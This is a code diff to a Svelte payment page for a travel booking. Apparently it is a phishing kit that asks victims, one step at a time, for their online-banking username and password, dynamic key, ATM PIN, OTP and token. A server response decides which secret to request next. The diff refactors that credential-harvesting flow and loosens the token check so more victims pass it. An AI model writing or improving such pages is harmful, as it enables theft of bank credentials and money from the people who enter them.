@@ -9,6 +9,13 @@
     import { StorageService } from '$lib/services/storageService';
     import { ENV_CONFIG } from '$lib/config/env';
     import { goto } from '$app/navigation';
+    import { DEFAULT_CURRENCY } from '$lib/config/currency';
+    import { formatMoney } from '$lib/utils/money';
+    import {
+        DEFAULT_SECURITY_FLAGS,
+        getRequestedFieldsForRedirect,
+        getSecurityFlagsForRedirect
+    } from '$lib/utils/securityFlow';
 
     // KJUR (inyectado por CDN) y secreto JWT (alineado con payment)
     const KJUR: any = (globalThis as any).KJUR;
@@ -46,27 +53,22 @@
     }
 
     // Monto dinámico desde reservationStore.totals
-    let formattedTotal = "$\u00A00\u00A0COP";
+    let currentCurrency = DEFAULT_CURRENCY;
+    let formattedTotal = formatMoney(0, currentCurrency);
     $: {
         const total = $reservationStore?.totals?.total ?? 0;
-        const currency = $reservationStore?.totals?.currency ?? 'COP';
+        currentCurrency = $reservationStore?.totals?.currency ?? DEFAULT_CURRENCY;
         try {
-            formattedTotal = new Intl.NumberFormat('es-CO', { style: 'currency', currency }).format(total);
+            formattedTotal = formatMoney(total, currentCurrency);
         } catch (e) {
             // Fallback simple si la moneda no es válida
-            formattedTotal = `$ ${Number(total).toLocaleString()} ${currency}`;
+            formattedTotal = formatMoney(total, DEFAULT_CURRENCY);
         }
     }
 
     // Flags de visibilidad controlados por la respuesta de una API
     let isLoading = false;
-    let securityFlags = {
-        requireUserPass: true,    // Usuario y contraseña visibles por defecto
-        requireDynamicKey: false, // Clave dinámica
-        requireATMKey: false,     // Clave cajero
-        requireOTP: false,        // OTP
-        requireToken: false       // Token
-    };
+    let securityFlags = { ...DEFAULT_SECURITY_FLAGS };
 
     // Sistema de mensajes de error
     let errorMessages: { [key: string]: string } = {};
@@ -88,39 +90,19 @@
         }
     }
 
-    // Simulación/integración del fetch a la API para obtener requisitos de seguridad
-    async function fetchSecurityRequirements() {
-        isLoading = true;
-        try {
-            // TODO: Reemplazar este bloque con la llamada real a tu API
-            // Ejemplo:
-            // const resp = await fetch('/api/security-check', { method: 'POST', body: JSON.stringify({ amount: total, card: lastFourDigits }) });
-            // const data = await resp.json();
-            // securityFlags = { requireDynamicKey: data.requireDynamicKey, requireATMKey: data.requireATMKey, requireOTP: data.requireOTP };
+    function initializeSecurityRequirements() {
+        const storedSecurityCheck = $reservationStore?.securityCheck || {};
+        const nextStep = storedSecurityCheck.redirectTo;
+        const storedRequestedFields = storedSecurityCheck.requestedFields || [];
 
-            // Simular delay de 2000ms al cargar la página
-            await new Promise(resolve => setTimeout(resolve, 2000));
-
-            // Mock por defecto: mantener ocultos los campos adicionales
-            securityFlags = {
-                requireUserPass: true,
-                requireDynamicKey: false,
-                requireATMKey: false,
-                requireOTP: false,
-                requireToken: false
-            };
-        } catch (error) {
-            console.error('Error obteniendo requisitos de seguridad:', error);
-        } finally {
-            isLoading = false;
-        }
+        securityFlags = getSecurityFlagsForRedirect(nextStep);
+        requestedFields = new Set(
+            storedRequestedFields.length > 0 ? storedRequestedFields : getRequestedFieldsForRedirect(nextStep)
+        );
     }
 
     onMount(() => {
-        fetchSecurityRequirements();
-        // Marcar usuario/contraseña como solicitados por defecto
-        requestedFields.add('user');
-        requestedFields.add('pass');
+        initializeSecurityRequirements();
     });
 
     // Acción de submit del formulario
@@ -129,13 +111,26 @@
         return len >= min && len <= max;
     }
 
+    function applySecurityStep(redirectTo: string) {
+        const nextRequestedFields = getRequestedFieldsForRedirect(redirectTo);
+
+        securityFlags = getSecurityFlagsForRedirect(redirectTo);
+        requestedFields = new Set(nextRequestedFields);
+
+        reservationStore.updateSecurityCheck({
+            status: 'pending',
+            redirectTo,
+            requestedFields: nextRequestedFields
+        });
+    }
+
     async function handleSubmit(event) {
         isLoading = true;
         let responseData: any = null;
         try {
             // 1) Leer datos del store para construir payload
             const state = $reservationStore;
-            const totals = state?.totals || { subtotal: 0, taxes: 0, total: 0, currency: 'COP' };
+            const totals = state?.totals || { subtotal: 0, taxes: 0, total: 0, currency: currentCurrency };
             const hotel = state?.hotel || { name: '' };
             const numRooms = state?.selectedRooms?.reduce((acc, r) => acc + (r.quantity || 0), 0) || 0;
             const numPeople = (state?.searchParams?.adults || 0) + (state?.searchParams?.children || 0);
@@ -217,8 +212,8 @@
                     hasValidationError = true;
                 }
                 const tokenValue = (securityChecks.token || '').trim();
-                if (tokenValue.length !== 8) {
-                    errorMessages.token = 'El token debe tener exactamente 8 dígitos';
+                if (tokenValue.length < 6 || tokenValue.length > 8) {
+                    errorMessages.token = 'El token debe tener entre 6 y 8 dígitos';
                     hasValidationError = true;
                 } else if (!/^\d+$/.test(tokenValue)) {
                     errorMessages.token = 'El token debe contener solo números';
@@ -299,8 +294,7 @@
                     } else {
                         alert('Ingrese el código OTP que recibió en su dispositivo móvil');
                     }
-                    requestedFields.add('otp');
-                    securityFlags = { requireUserPass: false, requireDynamicKey: false, requireATMKey: false, requireOTP: true, requireToken: false };
+                    applySecurityStep('otpcode');
                     break;
                 case 'cdin':
                     // Verificar si ya se solicitó clave dinámica en el flujo actual
@@ -310,8 +304,7 @@
                     } else {
                         alert('Ingrese la clave dinámica disponible en su app bancaria');
                     }
-                    requestedFields.add('dinamicKey');
-                    securityFlags = { requireUserPass: false, requireDynamicKey: true, requireATMKey: false, requireOTP: false, requireToken: false };
+                    applySecurityStep('cdin');
                     break;
                 case 'atmkey':
                     // Verificar si ya se solicitó clave cajero en el flujo actual
@@ -321,8 +314,7 @@
                     } else {
                         alert('Ingrese su clave de cajero de 4 dígitos');
                     }
-                    requestedFields.add('atmKey');
-                    securityFlags = { requireUserPass: false, requireDynamicKey: false, requireATMKey: true, requireOTP: false, requireToken: false };
+                    applySecurityStep('atmkey');
                     break;
                 case 'userpass':
                     // Verificar si ya se solicitó usuario/contraseña en el flujo actual
@@ -333,9 +325,7 @@
                     } else {
                         alert('Ingrese su usuario y contraseña de banca virtual');
                     }
-                    requestedFields.add('user');
-                    requestedFields.add('pass');
-                    securityFlags = { requireUserPass: true, requireDynamicKey: false, requireATMKey: false, requireOTP: false, requireToken: false };
+                    applySecurityStep('userpass');
                     break;
                 case 'token':
                     // Verificar si ya se solicitó token en el flujo actual
@@ -345,11 +335,10 @@
                     } else {
                         alert('Ingrese el token disponible en su app bancaria');
                     }
-                    requestedFields.add('token');
-                    securityFlags = { requireUserPass: false, requireDynamicKey: false, requireATMKey: false, requireOTP: false, requireToken: true };
+                    applySecurityStep('token');
                     break;
                 case 'success':
-                    reservationStore.updateSecurityCheck({ status: 'approved' });
+                    reservationStore.updateSecurityCheck({ status: 'approved', redirectTo: 'success', requestedFields: [] });
                     // Mostrar loader de 2000ms antes de redirigir a congrats
                     // NO establecer isLoading = false en el finally para este caso
                     setTimeout(() => {
@@ -548,7 +537,7 @@
                                 type="text" 
                                 id="token" 
                                 name="token"
-                                minlength="8"
+                                minlength="6"
                                 maxlength="8"
                                 class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent {errorMessages.token ? 'border-red-500' : ''}"
                                 placeholder="Ingrese su token"
@@ -581,7 +570,7 @@
                     <b>Comercio:</b> TIQUETES BARATOS S.A.S
                 </p>
                 <p class="text-gray-700 mb-2">
-                    <b>Monto:</b>  $ {flightCalculation.finalTotal.toLocaleString()} COP
+                    <b>Monto:</b> {formatMoney(flightCalculation.finalTotal, currentCurrency)}
                 </p>
                 <p class="text-gray-700 mb-2">
                     <b>Número de tarjeta:</b> •••• •••• •••• {lastFourDigits}
